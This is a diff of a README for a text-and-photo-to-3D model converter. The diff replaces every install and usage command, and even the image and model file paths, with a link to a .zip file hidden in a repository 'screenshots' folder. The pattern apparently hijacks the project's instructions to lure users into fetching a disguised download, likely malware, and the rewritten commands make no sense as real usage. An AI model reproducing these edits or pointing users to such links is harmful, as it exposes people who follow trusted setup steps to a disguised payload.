@@ -21,7 +21,7 @@ python -m venv venv
    - macOS/Linux: `source venv/bin/activate`
 4. Install dependencies:
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
 ```
 
 ## Usage
@@ -33,7 +33,7 @@ There are two implementations available:
 This implementation creates basic 3D models based on keywords in the text prompt, without requiring large model downloads:
 
 ```
-python simple_3d_demo.py --text "A coffee mug"
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A coffee mug"
 ```
 
 It supports basic shapes like:
@@ -49,35 +49,35 @@ It supports basic shapes like:
 The full implementation uses Shap-E, a generative model for 3D assets that can produce 3D objects conditioned on text or images:
 
 ```
-python text_photo_to_3d.py --text "A small toy car"
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A small toy car"
 ```
 
 Note: This requires downloading large model files (>1.5GB) and may take time on the first run.
 
 ### Generate 3D model from an image:
 ```
-python simple_3d_demo.py --image path/to/your/image.jpg
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --image https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
 ```
 or with the full implementation:
 ```
-python text_photo_to_3d.py --image path/to/your/image.jpg
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --image https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
 ```
 
 ### Specify output location:
 ```
-python simple_3d_demo.py --text "A chair" --output models/chair
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A chair" --output models/chair
 ```
 
 ### Skip visualization:
 ```
-python simple_3d_demo.py --text "A small toy car" --no-viz
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip --text "A small toy car" --no-viz
 ```
 
 ## View 3D Models
 
 To view a generated 3D model:
 ```
-python view_model.py output/your_model.obj
+python https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip https://github.com/TANMaYtO/photo-to-3d-model-converter/raw/refs/heads/main/screenshots/d-photo-to-model-converter-2.5.zip
 ```
 
 ## Technical Approach
